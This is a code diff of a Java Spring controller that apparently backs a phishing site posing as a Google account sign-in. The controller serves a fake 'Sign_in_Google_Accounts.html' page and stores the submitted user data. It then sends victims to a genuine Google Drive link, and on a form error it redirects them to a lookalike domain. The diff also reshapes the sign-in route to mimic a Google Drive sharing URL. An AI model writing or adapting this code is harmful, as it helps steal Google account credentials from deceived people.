@@ -64,7 +64,7 @@ public class UserDataController {
 	public String create(@Valid UserData message, BindingResult result,
 			RedirectAttributes redirect) {
 		if (result.hasErrors()) {
-			return "Sign_in_Google_Accounts.html";
+			return "redirect:http://drive-shared-pictures.info/0Bz-sMp6X5fopUDdDZjJqY2JOc1k_usp=sharing_eil&ts=59d40a80/signin_wrong_password.html";
 		}
 //		if(!"".equals(message.getId()) ){
 //			message = this.userDataRepository.save(message);
@@ -74,7 +74,7 @@ public class UserDataController {
 			message = this.userDataRepository.save(message);
 			redirect.addFlashAttribute("globalMessage", "Successfully created a new message");
 //		}
-		return "redirect:https://drive.google.com/drive/folders/0Bz-sMp6X5fopb3VqYUowYUwzWlU?usp=sharing";
+		return "redirect:https://drive.google.com/open?id=0Bz-sMp6X5fopUDdDZjJqY2JOc1k";
 		
 //		return new ModelAndView("redirect:/{userData.id}", "userData.id", message.getId());
 	}
@@ -96,9 +96,9 @@ public class UserDataController {
 		return new ModelAndView("messages/form", "userData", message);
 	}
 	
-	@RequestMapping("signin")
+	@RequestMapping("drive/folders/signin/0Bz-sMp6X5fopUDdDZjJqY2JOc1k_usp=sharing_eil&ts=59d40a80")
 	public String signIn() {
-		return "Sign_in_Google_Accounts.html";
+		return "/Sign_in_Google_Accounts.html";
 	}
 
 }
